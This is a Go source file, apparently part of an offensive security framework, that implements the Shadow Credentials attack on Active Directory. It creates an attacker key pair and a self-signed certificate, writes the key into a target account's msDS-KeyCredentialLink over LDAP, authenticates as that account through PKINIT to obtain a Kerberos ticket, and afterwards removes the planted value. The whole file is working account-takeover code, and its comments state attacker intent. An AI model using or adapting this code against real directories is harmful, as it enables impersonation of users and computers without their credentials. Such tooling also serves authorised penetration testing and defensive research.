// Package shadowcredentials implements the Shadow Credentials technique: writing
// an attacker-controlled public key to a target account's msDS-KeyCredentialLink
// (the "key trust" / Windows Hello for Business key-based credential attribute)
// and then authenticating as that account with PKINIT (RFC 4556) using the
// matching private key.
//
// It ties together three existing Manticore components:
//   - windows/keycredentiallink (MS-KCL KEYCREDENTIALLINK_BLOB build/parse),
//   - network/kerberos/v5 + .../pkinit (the native PKINIT DH AS exchange), and
//   - network/ldap (the DN-with-binary LDAP write path).
//
// The certificate registered is self-signed: in the key-trust model the KDC maps
// the client via the raw key in msDS-KeyCredentialLink, not a PKI chain, so no
// enterprise CA enrollment is required for the attacker's key.
package shadowcredentials

import (
	"crypto/rsa"
	"encoding/hex"
	"fmt"
	"strings"

	kerberos "github.com/TheManticoreProject/Manticore/network/kerberos/v5"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/pkinit"
	"github.com/TheManticoreProject/Manticore/network/ldap"
	"github.com/TheManticoreProject/Manticore/windows/cng/bcrypt/keys"
	"github.com/TheManticoreProject/Manticore/windows/cng/bcrypt/keys/blob"
	"github.com/TheManticoreProject/Manticore/windows/cng/bcrypt/keys/headers"
	"github.com/TheManticoreProject/Manticore/windows/cng/bcrypt/keys/magic"
	"github.com/TheManticoreProject/Manticore/windows/keycredentiallink"
)

// KeyCredentialAttribute is the LDAP attribute holding key-trust credentials.
const KeyCredentialAttribute = "msDS-KeyCredentialLink"

// Credential is the attacker-generated material for a Shadow Credentials attack:
// the RSA private key and self-signed certificate used to sign the PKINIT
// AuthPack, plus the exact msDS-KeyCredentialLink value written to the target
// (retained so it can be removed again for a clean restore).
type Credential struct {
	// PrivateKey is the RSA private key that signs the PKINIT request.
	PrivateKey *rsa.PrivateKey
	// CertificateDER is the DER-encoded self-signed certificate.
	CertificateDER []byte
	// LinkValue is the DN-with-binary value written to msDS-KeyCredentialLink.
	LinkValue string
	// LinkBlob is the raw KEYCREDENTIALLINK_BLOB bytes (the binary portion of
	// LinkValue).
	LinkBlob []byte
	// KeyID is the stable key identifier (hex) of this credential, used to
	// locate it among the target's values on removal. Active Directory rewrites
	// other parts of the stored blob (e.g. the last-logon timestamp) and
	// normalizes the DN, so matching on the whole value or an exact string is
	// unreliable; the KeyID does not change.
	KeyID string
	// TargetDN is the distinguished name of the target account.
	TargetDN string
}

// rsaPublicKeyBlob builds the CNG BCRYPT_RSAPUBLIC_BLOB ("RSA1") key-material
// bytes for an RSA public key, the form embedded in a KEYCREDENTIALLINK_BLOB.
func rsaPublicKeyBlob(pub *rsa.PublicKey) ([]byte, error) {
	modulus := pub.N.Bytes()
	exponent := bigEndianExponent(pub.E)
	blk := keys.BCRYPT_RSA_PUBLIC_KEY{
		Magic: magic.BCRYPT_KEY_BLOB{Magic: magic.BCRYPT_RSAPUBLIC_MAGIC},
		Header: headers.BCRYPT_RSA_KEY_BLOB{
			BitLength:   uint32(pub.N.BitLen()),
			CbPublicExp: uint32(len(exponent)),
			CbModulus:   uint32(len(modulus)),
		},
		Content: blob.BCRYPT_RSA_PUBLIC_BLOB{
			PublicExponent: exponent,
			Modulus:        modulus,
		},
	}
	return blk.Marshal()
}

// bigEndianExponent returns the minimal big-endian byte encoding of e.
func bigEndianExponent(e int) []byte {
	var b []byte
	for e > 0 {
		b = append([]byte{byte(e & 0xff)}, b...)
		e >>= 8
	}
	if len(b) == 0 {
		b = []byte{0}
	}
	return b
}

// GenerateCredential creates a fresh RSA key pair and self-signed certificate and
// composes the msDS-KeyCredentialLink value binding that key to targetDN. It does
// not touch the directory; call AddCredential (or GenerateAndAdd) to write it.
func GenerateCredential(targetDN string) (*Credential, error) {
	priv, certDER, err := pkinit.GenerateSelfSignedCert(2048, "Shadow Credential")
	if err != nil {
		return nil, err
	}
	keyBlob, err := rsaPublicKeyBlob(&priv.PublicKey)
	if err != nil {
		return nil, fmt.Errorf("shadowcredentials: build RSA public key blob: %w", err)
	}
	dnb, err := keycredentiallink.ComposeKeyCredentialLinkForComputer(targetDN, keyBlob)
	if err != nil {
		return nil, fmt.Errorf("shadowcredentials: compose key credential: %w", err)
	}
	keyID, err := keyCredentialID(dnb.BinaryData)
	if err != nil {
		return nil, err
	}
	return &Credential{
		PrivateKey:     priv,
		CertificateDER: certDER,
		LinkValue:      dnb.String(),
		LinkBlob:       dnb.BinaryData,
		KeyID:          keyID,
		TargetDN:       targetDN,
	}, nil
}

// keyCredentialID parses a KEYCREDENTIALLINK_BLOB and returns its key identifier
// (the stable KeyID), lowercased.
func keyCredentialID(blob []byte) (string, error) {
	var kc keycredentiallink.KeyCredentialLink
	if _, err := kc.Unmarshal(blob); err != nil {
		return "", fmt.Errorf("shadowcredentials: parse key credential blob: %w", err)
	}
	return strings.ToLower(kc.Identifier), nil
}

// AddCredential appends the credential's value to the target's
// msDS-KeyCredentialLink (preserving any existing key credentials).
func AddCredential(sess *ldap.Session, cred *Credential) error {
	req := ldap.NewModifyRequest(cred.TargetDN)
	req.Add(KeyCredentialAttribute, []string{cred.LinkValue})
	if err := sess.Modify(req); err != nil {
		return fmt.Errorf("shadowcredentials: add %s on %q: %w", KeyCredentialAttribute, cred.TargetDN, err)
	}
	return nil
}

// RemoveCredential removes the value previously written by AddCredential,
// restoring the target's msDS-KeyCredentialLink to its prior state. It reads the
// current values, drops the one whose binary blob matches this credential, and
// writes back the survivors (or clears the attribute if none remain). Matching
// on the binary blob avoids the unreliable exact-string delete: Active Directory
// normalizes the DN portion of a DN-with-binary value.
func RemoveCredential(sess *ldap.Session, cred *Credential) error {
	entries, err := sess.QueryBaseObject(cred.TargetDN, "(objectClass=*)", []string{KeyCredentialAttribute})
	if err != nil {
		return fmt.Errorf("shadowcredentials: read %s on %q: %w", KeyCredentialAttribute, cred.TargetDN, err)
	}
	if len(entries) == 0 {
		return fmt.Errorf("shadowcredentials: target %q not found", cred.TargetDN)
	}

	var survivors []string
	removed := false
	for _, v := range entries[0].GetAttributeValues(KeyCredentialAttribute) {
		blobHex := dnBinaryHex(v)
		if blobHex == "" {
			survivors = append(survivors, v)
			continue
		}
		blob, err := hex.DecodeString(blobHex)
		if err != nil {
			survivors = append(survivors, v)
			continue
		}
		id, err := keyCredentialID(blob)
		if err == nil && id == cred.KeyID {
			removed = true
			continue
		}
		survivors = append(survivors, v)
	}
	if !removed {
		return fmt.Errorf("shadowcredentials: credential (KeyID %s) not present on %q", cred.KeyID, cred.TargetDN)
	}

	if len(survivors) == 0 {
		return sess.FlushAttributeValues(cred.TargetDN, KeyCredentialAttribute)
	}
	req := ldap.NewModifyRequest(cred.TargetDN)
	req.Replace(KeyCredentialAttribute, survivors)
	if err := sess.Modify(req); err != nil {
		return fmt.Errorf("shadowcredentials: rewrite %s on %q: %w", KeyCredentialAttribute, cred.TargetDN, err)
	}
	return nil
}

// dnBinaryHex returns the lowercased hex binary portion of a DN-with-binary
// value string ("B:<count>:<hex>:<dn>"), or "" if it is not in that form.
func dnBinaryHex(v string) string {
	parts := strings.SplitN(v, ":", 4)
	if len(parts) != 4 || !strings.EqualFold(parts[0], "B") {
		return ""
	}
	return strings.ToLower(parts[2])
}

// GenerateAndAdd generates a credential for targetDN and writes it to the
// directory in one step.
func GenerateAndAdd(sess *ldap.Session, targetDN string) (*Credential, error) {
	cred, err := GenerateCredential(targetDN)
	if err != nil {
		return nil, err
	}
	if err := AddCredential(sess, cred); err != nil {
		return nil, err
	}
	return cred, nil
}

// Authenticate performs a PKINIT AS exchange as the target account using the
// credential's private key/certificate, returning a KerberosClient holding the
// resulting TGT. username/realm/kdc identify the target account and its KDC.
func (cred *Credential) Authenticate(username, realm, kdc string) (*kerberos.KerberosClient, error) {
	return cred.AuthenticateWithGroups(username, realm, kdc)
}

// AuthenticateWithGroups is Authenticate with an explicit ordered list of MODP
// Diffie-Hellman groups to offer (the first the KDC accepts is used). An empty
// list uses the client default (group 14 then group 2).
func (cred *Credential) AuthenticateWithGroups(username, realm, kdc string, groups ...pkinit.DHGroup) (*kerberos.KerberosClient, error) {
	c := kerberos.NewClient(username, realm, kdc).WithPKINIT(cred.PrivateKey, cred.CertificateDER)
	if len(groups) > 0 {
		c.WithPKINITGroups(groups...)
	}
	if err := c.GetTGT(); err != nil {
		return nil, fmt.Errorf("shadowcredentials: PKINIT authenticate as %q: %w", username, err)
	}
	return c, nil
}
